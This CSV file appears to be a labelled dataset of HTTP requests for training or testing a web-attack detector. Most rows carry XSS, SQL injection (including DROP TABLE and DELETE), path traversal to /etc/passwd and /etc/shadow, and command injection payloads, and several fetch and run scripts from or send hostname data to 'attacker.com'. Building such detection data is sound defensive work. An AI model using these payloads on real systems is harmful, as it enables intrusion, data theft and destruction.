request_text,label
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(1)</script>&user=test",xss
"GET /api/file?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /product/product_123 HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=') OR ('1'='1&password=test",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& id",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null,null--&password=test",sqli
"GET /product/cat_books HTTP/1.1
Host: example.com
Accept: application/json",benign
"PUT /api/users/charlie HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""charlie@email.com"",""name"":""Charlie""}",benign
"GET /files/image.png HTTP/1.1
Host: example.com",benign
"GET /tools?host=8.8.8.8| id HTTP/1.1
Host: example.com",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; cat /etc/passwd",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src='x' onerror='alert(document.cookie)'>&user=test",xss
"GET /api/file?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john_doe&password=SecureP@ss1",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost`id`",cmdi
"GET /product/brand_apple HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8`whoami`",cmdi
"GET /login?q='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(document.cookie)&user=test",xss
"GET /search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| ping attacker.com",cmdi
"DELETE /api/cart/item/56 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /view?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /comment?q=expression(alert(1)) HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /posts?q=""><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND extractvalue(1,concat(0x7e,version()))--&password=test",sqli
"GET /debug?host=check$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"GET /static?file=php://input HTTP/1.1
Host: example.com",traversal
"GET /api/execute?host=8.8.8.8| find / -perm -4000 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test|| whoami",cmdi
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"GET /view?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; whoami",cmdi
"GET /view?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /checkout?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /debug?host=8.8.8.8&& ls /etc HTTP/1.1
Host: example.com",cmdi
"GET /images?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /run?host=test; id HTTP/1.1
Host: example.com",cmdi
"GET /files?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ping -c 5 attacker.com",cmdi
"GET /download?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND SLEEP(5)--&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| id",cmdi
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"GET /admin/login?q=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: example.com",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test",sqli
"GET /feedback?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND 1=2--&password=test",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' /*&password=test",sqli
"GET /search?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| type C:\Windows\System32\drivers\etc\hosts",cmdi
"GET /comment?q='><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /profile?q=""><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /files?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg/onload=alert(1)>&user=test",xss
"GET /posts?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND extractvalue(1,concat(0x7e,version()))--&password=test",sqli
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1--&password=test",sqli
"GET /api/execute?host=192.168.1.1`cat /etc/hosts` HTTP/1.1
Host: example.com",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<link rel=stylesheet href=javascript:alert(1)>&user=test",xss
"GET /download?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"GET /user?q=1;SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; whoami",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<embed src=javascript:alert(1)>&user=test",xss
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND SLEEP(5)--&password=test",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"GET /api/execute?host=8.8.8.8$(whoami) HTTP/1.1
Host: example.com",cmdi
"GET /product?q=1;SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"GET /checkout?q=1' ORDER BY 10-- HTTP/1.1
Host: example.com",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=';SELECT pg_sleep(5)--&password=test",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /files?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; id",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=frank&password=SecureP@ss1",benign
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT version()--&password=test",sqli
"GET /tools?host=check& dir HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<embed src=javascript:alert(1)>&user=test",xss
"GET /user?q='; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| uname -a",cmdi
"GET /files/style.css HTTP/1.1
Host: example.com",benign
"GET /api/file?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"GET /download?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /feedback?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"GET /ping?host=test; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"GET /profile?q=<svg onload=prompt(document.domain)> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=';alert(String.fromCharCode(88,83,83))//&user=test",xss
"GET /exec?host=check`whoami` HTTP/1.1
Host: example.com",cmdi
"GET /api/auth?q=' UNION SELECT username,password FROM users-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: example.com",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ping -c 5 attacker.com",cmdi
"GET /api/data?limit=13&offset=405&format=json HTTP/1.1
Host: example.com",benign
"GET /tools?host=test&& whoami HTTP/1.1
Host: example.com",cmdi
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=test",sqli
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check`whoami`",cmdi
"GET /static?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /download?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| id",cmdi
"GET /admin/login?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(cat /etc/group)",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>&user=test",xss
"GET /search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /view?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m",cmdi
"GET /api/auth?q=' UNION SELECT null,null-- HTTP/1.1
Host: example.com",sqli
"GET /files/style.css HTTP/1.1
Host: example.com",benign
"GET /user?q=') OR ('1'='1 HTTP/1.1
Host: example.com",sqli
"GET /files?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/products HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<style>body{background:url('javascript:alert(1)')}</style>&user=test",xss
"GET /files?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /posts?q=<link rel=stylesheet href=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /posts?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"GET /posts?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /static?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /tools?host=localhost$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=expression(alert(1))&user=test",xss
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /checkout?q=1' OR '1'='1'-- HTTP/1.1
Host: example.com",sqli
"DELETE /api/cart/item/522 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /static?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/diana HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""diana@email.com"",""name"":""Diana""}",benign
"GET /api/data?limit=28&offset=304&format=json HTTP/1.1
Host: example.com",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; uname -a",cmdi
"GET /login?q=OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /ping?host=192.168.1.1; ls -la HTTP/1.1
Host: example.com",cmdi
"GET /exec?host=localhost$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=0x27 OR 0x31=0x31--&password=test",sqli
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1--&password=test",sqli
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>&user=test",xss
"GET /files?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| type C:\Windows\System32\drivers\etc\hosts",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| find / -perm -4000 2>/dev/null",cmdi
"GET /api/file?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"GET /view?file=..\..\..\windows\win.ini HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"GET /run?host=check$(whoami) HTTP/1.1
Host: example.com",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=-moz-binding: url(http://attacker.com/xss.xml#xss)&user=test",xss
"GET /static?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<video src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=test",sqli
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<input onfocus=alert(1) autofocus>&user=test",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DELETE FROM users--&password=test",sqli
"GET /api/auth?q=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: example.com",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<select onchange=alert(1)><option>1</option></select>&user=test",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; printenv",cmdi
"GET /api/data?limit=64&offset=395&format=json HTTP/1.1
Host: example.com",benign
